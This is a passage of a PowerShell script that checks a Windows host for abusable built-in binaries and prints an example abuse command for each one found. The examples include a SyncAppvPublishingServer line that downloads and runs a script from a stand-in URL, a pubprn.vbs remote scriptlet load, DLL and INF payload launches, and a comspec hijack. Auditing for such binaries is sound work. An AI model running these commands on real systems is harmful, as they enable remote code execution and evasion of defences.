 'C:\Windows\System32\pcwutl.dll' = 'Pcwutl.dll', 'rundll32.exe pcwutl.dll,LaunchApplication calc.exe';
 'C:\Windows\SysWOW64\pcwutl.dll' = 'Pcwutl.dll', 'rundll32.exe pcwutl.dll,LaunchApplication calc.exe';
 'C:\Windows\System32\setupapi.dll' = 'Setupapi.dll', 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf';
 'C:\Windows\SysWOW64\setupapi.dll' = 'Setupapi.dll', 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf';
 'C:\Windows\System32\shdocvw.dll' = 'Shdocvw.dll', "'rundll32.exe shdocvw.dll,OpenURL 'C:\test\calc.url'";
 'C:\Windows\SysWOW64\shdocvw.dll' = 'Shdocvw.dll', "'rundll32.exe shdocvw.dll,OpenURL 'C:\test\calc.url'";
 'C:\Windows\System32\shell32.dll' = 'Shell32.dll', 'rundll32.exe shell32.dll,Control_RunDLL payload.dll';
 'C:\Windows\SysWOW64\shell32.dll' = 'Shell32.dll', 'rundll32.exe shell32.dll,Control_RunDLL payload.dll';
 'C:\Windows\System32\syssetup.dll' = 'Syssetup.dll', 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\test\shady.inf';
 'C:\Windows\SysWOW64\syssetup.dll' = 'Syssetup.dll', 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\test\shady.inf';
 'C:\Windows\System32\url.dll' = 'Url.dll', "'rundll32.exe url.dll,OpenURL 'C:\test\calc.hta'";
 'C:\Windows\SysWOW64\url.dll' = 'Url.dll', "'rundll32.exe url.dll,OpenURL 'C:\test\calc.hta'";
 'C:\Windows\System32\zipfldr.dll' = 'Zipfldr.dll', 'rundll32.exe zipfldr.dll,RouteTheCall calc.exe';
 'C:\Windows\SysWOW64\zipfldr.dll' = 'Zipfldr.dll', 'rundll32.exe zipfldr.dll,RouteTheCall calc.exe';
 'C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1' = 'CL_Invocation.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \nSyncInvoke <executable> [args]';
 'C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1' = 'CL_Invocation.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \nSyncInvoke <executable> [args]';
 'C:\Windows\diagnostics\system\WindowsUpdate\CL_Invocation.ps1' = 'CL_Invocation.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \nSyncInvoke <executable> [args]';
 'C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1' = 'CL_Mutexverifiers.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1';
 'C:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1' = 'CL_Mutexverifiers.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1';
 'C:\Windows\System32\manage-bde.wsf' = 'Manage-bde.wsf', 'set comspec=C:\Windows\System32\calc.exe & cscript C:\Windows\System32\manage-bde.wsf';
 'C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat' = 'Pester.bat', "'Pester.bat [/help|?|-?|/?] '$null; notepad'";
 'c:\Program Files\WindowsPowerShell\Modules\Pester\*\bin\Pester.bat' = 'Pester.bat', "'Pester.bat [/help|?|-?|/?] '$null; notepad'";
 'C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs' = 'Pubprn.vbs', 'pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct';
 'C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs' = 'Pubprn.vbs', 'pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct';
 'C:\Windows\System32\slmgr.vbs' = 'Slmgr.vbs', 'reg.exe import C:\path\to\Slmgr.reg & cscript.exe /b C:\Windows\System32\slmgr.vbs';
 'C:\Windows\SysWOW64\slmgr.vbs' = 'Slmgr.vbs', 'reg.exe import C:\path\to\Slmgr.reg & cscript.exe /b C:\Windows\System32\slmgr.vbs';
 'C:\Windows\System32\SyncAppvPublishingServer.vbs' = 'Syncappvpublishingserver.vbs', "'SyncAppvPublishingServer.vbs 'n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX'";
 'C:\Windows\System32\winrm.vbs' = 'winrm.vbs', 'reg.exe import C:\path\to\Slmgr.reg & winrm quickconfig';
 'C:\Windows\SysWOW64\winrm.vbs' = 'winrm.vbs', 'reg.exe import C:\path\to\Slmgr.reg & winrm quickconfig';
 'C:\Program Files\Microsoft Office\root\client\appvlp.exe' = 'Appvlp.exe', 'AppVLP.exe \\webdav\calc.bat';
 'C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe' = 'Appvlp.exe', 'AppVLP.exe \\webdav\calc.bat';
 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe' = 'Cdb.exe', 'cdb.exe -cf x64_calc.wds -o notepad.exe';
 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe' = 'Cdb.exe', 'cdb.exe -cf x64_calc.wds -o notepad.exe';
 'C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe' = 'csi.exe', 'csi.exe file';
 'C:\Program Files (x86)\Microsoft Web Tools\Packages\Microsoft.Net.Compilers.X.Y.Z\tools\csi.exe' = 'csi.exe', 'csi.exe file';
 'C:\Windows\System32\dxcap.exe' = 'Dxcap.exe', 'Dxcap.exe -c C:\Windows\System32\notepad.exe';
 'C:\Windows\SysWOW64\dxcap.exe' = 'Dxcap.exe', 'Dxcap.exe -c C:\Windows\System32\notepad.exe';
 'C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x86\Msftrace.exe' = 'Mftrace.exe', 'Mftrace.exe cmd.exe';
 'C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\Msftrace.exe' = 'Mftrace.exe', 'Mftrace.exe cmd.exe';
 'C:\Program Files (x86)\Windows Kits\10\bin\x86\Msftrace.exe' = 'Mftrace.exe', 'Mftrace.exe cmd.exe';
 'C:\Program Files (x86)\Windows Kits\10\bin\x64\Msftrace.exe' = 'Mftrace.exe', 'Mftrace.exe cmd.exe';
 'C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe' = 'Msdeploy.exe', "'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand='C:\temp\calc.bat'";
 'C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe' = 'Sqldumper.exe', 'sqldumper.exe 464 0 0x0110';
 'C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe' = 'Sqldumper.exe', 'sqldumper.exe 464 0 0x0110';
 'C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe' = 'Sqlps.exe', 'Sqlps.exe -noprofile';
 'C:\Program files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe' = 'Sqlps.exe', 'Sqlps.exe -noprofile';
 'C:\Program files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe' = 'Sqlps.exe', 'Sqlps.exe -noprofile';
 'C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe' = 'SQLToolsPS.exe', 'SQLToolsPS.exe -noprofile -command Start-Process calc.exe';
 'C:\Windows\System32\vsjitdebugger.exe' = 'vsjitdebugger.exe', 'Vsjitdebugger.exe calc.exe';
 'C:\Windows\System32\wsl.exe' = 'Wsl.exe', 'wsl.exe -e /mnt/c/Windows/System32/calc.exe'
  }
  $dict[$localappdata + '\Microsoft\Teams\update.exe'] = 'Update.exe', 'Update.exe --download [url to package]'
  $dict[$localappdata + '\Microsoft\Teams\current\Squirrel.exe'] = 'Squirrel.exe', 'squirrel.exe --download [url to package]'
  $line = find_exes($dict)
  $manual = ''
  $manual += 'Bginfo.exe xx Must Verify Manually xx bginfo.exe bginfo.bgi /popup /nolicprompt' +  "`r`n"
  $manual += 'dnx.exe xx Must Verify Manually xx dnx.exe consoleapp' +  "`r`n"
  $manual += 'msxsl.exe xx Must Verify Manually xx msxsl.exe customers.xml script.xsl' +  "`r`n"
  $manual += 'Nvuhda6.exe xx Must Verify Manually xx nvuhda6.exe System calc.exe' +  "`r`n"
  $manual += 'rcsi.exe  xx Must Verify Manually xx rcsi.exe bypass.csx' +  "`r`n"
  $manual += 'te.exe xx Must Verify Manually xx te.exe bypass.wsc' +  "`r`n"
  $manual += 'Tracker.exe xx Must Verify Manually xx Tracker.exe /d .\calc.dll /c C:\Windows\write.exe' +  "`r`n"
  if($OutFile){
    pretty_print_file($line, $manual)
  }

  else{
    pretty_print($line, $manual)
  }
}

if ($OutFile){
  Write-Host "Outfile: $OutFile"
  Find-LOLBAS -OutFile $OutFile
}
else{
  Find-LOLBAS
}
